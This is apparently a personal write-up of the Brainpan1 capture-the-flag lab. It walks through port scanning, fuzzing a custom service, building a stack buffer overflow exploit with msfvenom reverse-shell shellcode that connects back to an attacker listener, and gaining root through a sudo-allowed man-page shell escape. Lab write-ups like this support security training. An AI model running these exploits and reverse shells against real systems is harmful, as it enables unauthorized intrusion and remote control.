---
date: 2024-10-24
title: Brainpan1 THM Write-Up
machine_ip: varies
os: Linux
difficulty: Hard
my_rating: 1
tags:
  - Linux
  - PrivEsc
  - BufferOverflow
  - OSCP
  - ghidra
  - nc
  - Windows
  - msf-pattern_create
  - msf-pattern_offset
  - sudo
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~]
└─# rustscan -a 10.10.217.7 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.217.7:10000
Open 10.10.217.7:9999
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.217.7
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
adjust_timeouts2: packet supposedly had rtt of -357566 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -357566 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -354921 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -354921 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -356543 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -356543 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -351332 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -351332 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -106448 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -106448 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -326585 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -326585 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -325356 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -325356 microseconds.  Ignoring time.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 12:30 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:30
Completed NSE at 12:30, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:30
Completed Parallel DNS resolution of 1 host. at 12:30, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:30
Scanning 10.10.217.7 [2 ports]
Discovered open port 9999/tcp on 10.10.217.7
Discovered open port 10000/tcp on 10.10.217.7
Completed SYN Stealth Scan at 12:30, 0.18s elapsed (2 total ports)
Initiating Service scan at 12:30
Scanning 2 services on 10.10.217.7
Completed Service scan at 12:30, 16.06s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.217.7
Retrying OS detection (try #2) against 10.10.217.7
Initiating Traceroute at 12:31
Completed Traceroute at 12:31, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 12:31
Completed Parallel DNS resolution of 2 hosts. at 12:31, 0.04s elapsed
DNS resolution of 2 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.217.7.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
NSE Timing: About 99.65% done; ETC: 12:31 (0:00:00 remaining)
Completed NSE at 12:31, 32.25s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 2.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Nmap scan report for 10.10.217.7
Host is up, received user-set (0.16s latency).
Scanned at 2024-10-25 12:30:41 PDT for 59s

PORT      STATE SERVICE REASON         VERSION
9999/tcp  open  abyss?  syn-ack ttl 61
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    syn-ack ttl 61 SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=10/25%Time=671BF1E8%P=x86_64-pc-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1.1 (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Linux 2.6.32 (93%), Linux 3.0 - 3.2 (93%), Linux 3.0 - 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/25%OT=9999%CT=%CU=39075%PV=Y%DS=4%DC=T%G=N%TM=671BF21C%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=8)
SEQ(SP=109%GCD=1%ISR=10B%TI=Z%CI=Z%TS=8)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=45EA%W2=45EA%W3=45EA%W4=45EA%W5=45EA%W6=45EA)
ECN(R=Y%DF=Y%T=40%W=4602%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 190.459 days (since Thu Apr 18 01:30:39 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 9999/tcp)
HOP RTT       ADDRESS
1   46.17 ms  10.2.0.1
2   ... 3
4   171.37 ms 10.10.217.7

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:31
Completed NSE at 12:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.86 seconds
           Raw packets sent: 79 (6.312KB) | Rcvd: 1779 (198.761KB)

```
- We see a #SimpleHTTPServer service running on the box and something called `brainpan` on port 9999

- Web enumeration
	- feroxbuster - directories/files
```
┌──(root㉿kali)-[~]
└─# feroxbuster -r -k --url http://10.10.217.7:10000
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.217.7:10000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       25w      195c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1931l    14011w  1499105c http://10.10.217.7:10000/soss-infographic-final.png
200      GET        8l       14w      215c http://10.10.217.7:10000/
200      GET       35l      372w    24660c http://10.10.217.7:10000/bin/brainpan.exe
200      GET       11l       24w      230c http://10.10.217.7:10000/bin/
```
- Ah, we see an executable in `/bin/brainpan.exe`
	- Likely need to reverse engineer this?

	- whatweb for port 10000
```
┌──(root㉿kali)-[~]
└─# whatweb http://10.10.217.7:10000                                   
http://10.10.217.7:10000 [200 OK] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.3], IP[10.10.217.7], Python[2.7.3]
```
- Running Python 2.7.3

- We can connect to port 9999 with #nc 
```
┌──(root㉿kali)-[~]
└─# nc 10.10.217.7 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              

                          >> 
```
- We need to get past this somehow

---
# Foothold

- gain shell via exploit
- - This is where `/bin/brainpan.exe` analysis comes into play, reverse engineer
	- Use #ghidra and decompile the `.exe`
		- find `_get_reply`, follow the function
		- Jumping to that function, we can see this is where those debugging statements are being printed to our terminal. In addition, there is a `strcmp` at the bottom with the string `shitstorm`.
		- Dead end

- Create a fuzzer for buffer check
```
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
        try:
                payload = buffer + '\r\n'
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('10.10.217.7',9999))
                print("[+] Sending payload...\n" + str(len(buffer)))
                s.send((payload.encode()))
                s.close() 
                sleep(1)
                buffer = buffer + "A" * 100 
        except: 
                print("The fuzzing crashed at %s bytes" % str(len(buffer)))
                sys.exit()
```

- Run script
```
┌──(root㉿kali)-[~/Transfer]
└─# python3 fuzzer.py
[+] Sending payload...
100
[+] Sending payload...
200
[+] Sending payload...
300
[+] Sending payload...
400
[+] Sending payload...
500
[+] Sending payload...
600
[+] Sending payload...
700
The fuzzing crashed at 800 bytes
```
- Overwriting memory with A's shows us where we are overwriting EIP, we want to control the pointer
- Create a buffer pattern with #msf-pattern_create 
```
──(root㉿kali)-[~]
└─# msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```
- Put this code in fuzzer script and modify it to:
```
import sys, socket     

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7A>
 
print("Sending payload...")
payload = buffer + '\r\n'  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.217.7',9999))
s.send((payload.encode()))
s.close()
```
- Run script,
- Find the EIP change, `35724134` in #ghidra
- Regenerate buffer with `35724134` using #msf-pattern_offset to find exact offset
```
┌──(root㉿kali)-[~]
└─# msf-pattern_offset -l 1000 -q 35724134
[*] Exact match at offset 524
```
- Edit fuzzer script again:
```
  GNU nano 8.0                                                              fuzzer.py *                                                                     
import sys, socket

buffer = "A" * 524 + "B" * 4

print("Sending payload...")
payload = buffer + '\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.217.7',9999))
s.send((payload.encode()))
s.close()
```
- Run script,
- Find the EIP change, `42424242` in #ghidra 
- Grab[ bad character list](https://github.com/mrinalpande/scripts/blob/master/python/badchars), and modify fuzzer script again
```
  GNU nano 8.0                                                              fuzzer.py                                                                       
import sys, socket

buffer = "A" * 524 + "B" * 4

badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff") 

print("Sending payload...")
payload = buffer + badchars + '\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.217.7',9999))
s.send((payload.encode()))
s.close()
```
- Follow in Dump the EAP from #ghidra
	- Look for any bad chars
	- There are none
- Another walkthrough is followed

- Okay, now it was time for me to craft the exploit. I decided to try the simplest thing first which would be to overwrite the `$eip` with the instruction `jmp esp`. That would cause the program to skip the return address and keep executing in order. From there, I could add a few `nops`, and then some shell code that would hopefully execute and give me a reverse shell. So all in all, the exploit should look like:  
- `buffer + jmp esp instruction + a few nops + shellcode`
- I created the shell code using msfvenom and the command:  
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=4444 -b ‘\x00’ -f c
```
- All together, here is the exploit:
```
import sys, socket

buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32

payload2 = (b"\xda\xdd\xd9\x74\x24\xf4\x5f\x31\xc9\xba\x5b\x82\x6a\xb2"
b"\xb1\x52\x31\x57\x17\x03\x57\x17\x83\xb4\x7e\x88\x47\xb6"
b"\x97\xcf\xa8\x46\x68\xb0\x21\xa3\x59\xf0\x56\xa0\xca\xc0"
b"\x1d\xe4\xe6\xab\x70\x1c\x7c\xd9\x5c\x13\x35\x54\xbb\x1a"
b"\xc6\xc5\xff\x3d\x44\x14\x2c\x9d\x75\xd7\x21\xdc\xb2\x0a"
b"\xcb\x8c\x6b\x40\x7e\x20\x1f\x1c\x43\xcb\x53\xb0\xc3\x28"
b"\x23\xb3\xe2\xff\x3f\xea\x24\xfe\xec\x86\x6c\x18\xf0\xa3"
b"\x27\x93\xc2\x58\xb6\x75\x1b\xa0\x15\xb8\x93\x53\x67\xfd"
b"\x14\x8c\x12\xf7\x66\x31\x25\xcc\x15\xed\xa0\xd6\xbe\x66"
b"\x12\x32\x3e\xaa\xc5\xb1\x4c\x07\x81\x9d\x50\x96\x46\x96"
b"\x6d\x13\x69\x78\xe4\x67\x4e\x5c\xac\x3c\xef\xc5\x08\x92"
b"\x10\x15\xf3\x4b\xb5\x5e\x1e\x9f\xc4\x3d\x77\x6c\xe5\xbd"
b"\x87\xfa\x7e\xce\xb5\xa5\xd4\x58\xf6\x2e\xf3\x9f\xf9\x04"
b"\x43\x0f\x04\xa7\xb4\x06\xc3\xf3\xe4\x30\xe2\x7b\x6f\xc0"
b"\x0b\xae\x20\x90\xa3\x01\x81\x40\x04\xf2\x69\x8a\x8b\x2d"
b"\x89\xb5\x41\x46\x20\x4c\x02\x63\xb7\x4f\xa5\x1b\xb5\x4f"
b"\x58\x80\x30\xa9\x30\x28\x15\x62\xad\xd1\x3c\xf8\x4c\x1d"
b"\xeb\x85\x4f\x95\x18\x7a\x01\x5e\x54\x68\xf6\xae\x23\xd2"
b"\x51\xb0\x99\x7a\x3d\x23\x46\x7a\x48\x58\xd1\x2d\x1d\xae"
b"\x28\xbb\xb3\x89\x82\xd9\x49\x4f\xec\x59\x96\xac\xf3\x60"
b"\x5b\x88\xd7\x72\xa5\x11\x5c\x26\x79\x44\x0a\x90\x3f\x3e"
b"\xfc\x4a\x96\xed\x56\x1a\x6f\xde\x68\x5c\x70\x0b\x1f\x80"
b"\xc1\xe2\x66\xbf\xee\x62\x6f\xb8\x12\x13\x90\x13\x97\x23"
b"\xdb\x39\xbe\xab\x82\xa8\x82\xb1\x34\x07\xc0\xcf\xb6\xad"
b"\xb9\x2b\xa6\xc4\xbc\x70\x60\x35\xcd\xe9\x05\x39\x62\x09"
b"\x0c")


print("Sending payload...") 
payload = buffer + payload2 + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.217.7',9999))
s.send(payload)
s.close()
```
- Now, start #nc listener and run fuzzer script to catch shell using #BufferOverflow 
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4444                                                                   
listening on [any] 4444 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.217.7] 40748
CMD Version 1.4.1

Z:\home\puck>
```
- This is a windows shell on linux? Redo exploit but with linux payload
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=4444 -b ‘\x00’ -f c
```
- Edit fuzzer script
```
import sys, socket

buffer = b"A" * 524 + b"\xf3\x12\x17\x31" + b"\x90" * 32

payload2 = (b"\xda\xd8\xb8\x7c\x2d\xf5\x9e\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x12\x83\xea\xfc\x31\x42\x13\x03\x3e\x3e\x17\x6b\x8f"
b"\x9b\x20\x77\xbc\x58\x9c\x12\x40\xd6\xc3\x53\x22\x25\x83"
b"\x07\xf3\x05\xbb\xea\x83\x2f\xbd\x0d\xeb\xa5\x3f\xef\x9c"
b"\xd1\x3d\xef\x73\x7e\xcb\x0e\xc3\x18\x9b\x81\x70\x56\x18"
b"\xab\x97\x55\x9f\xf9\x3f\x08\x8f\x8e\xd7\xbc\xe0\x5f\x45"
b"\x54\x76\x7c\xdb\xf5\x01\x62\x6b\xf2\xdc\xe5")


print("Sending payload...")
payload = buffer + payload2 + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.217.7',9999))
s.send(payload)
s.close()
```
- Send script and catch reverse linux shell
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 4444                                                                     
listening on [any] 4444 ...
connect to [10.2.1.119] from (UNKNOWN) [10.10.217.7] 40749
whoami
puck
python3 -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ id
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
```

---
# PrivEsc

- escalate to root
- Enumerate
```
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

- Hm what is this `anansi_util` we can run as root
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util             
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
- We can run manual commands with sudo?
```
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual ls
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)
LS(1)                            User Commands                           LS(1)

NAME
       ls - list directory contents

SYNOPSIS
       ls [OPTION]... [FILE]...

DESCRIPTION
       List  information  about  the FILEs (the current directory by default).
       Sort entries alphabetically if none of -cftuvSUX nor --sort  is  speci‐
       fied.

       Mandatory  arguments  to  long  options are mandatory for short options
       too.

       -a, --all
              do not ignore entries starting with .

       -A, --almost-all
              do not list implied . and ..

       --author
 Manual page ls(1) line 1 (press h for help or q to quit)!/bin/bash
!/bin/bash
root@brainpan:/usr/share/man# whoami
whoami
root
root@brainpan:/usr/share/man# id
id
uid=0(root) gid=0(root) groups=0(root)
```
- We escalated by running `!/bin/bash` while sitting in the `ls` manual page!